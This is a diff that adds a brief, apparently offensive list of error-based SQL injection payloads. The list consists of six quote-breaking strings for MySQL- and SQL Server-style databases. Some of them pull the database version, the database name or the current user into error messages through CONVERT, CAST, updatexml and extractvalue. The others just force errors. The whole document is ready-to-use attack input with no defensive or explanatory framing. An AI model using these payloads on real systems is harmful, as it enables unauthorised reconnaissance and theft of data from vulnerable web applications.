@@ -1,0 +1,8 @@
+Error based SQl injection :~
+
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT database()) AS int)--
+' AND (SELECT 1/0)--
+' AND (SELECT COUNT(*) FROM non_existing_table)--
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
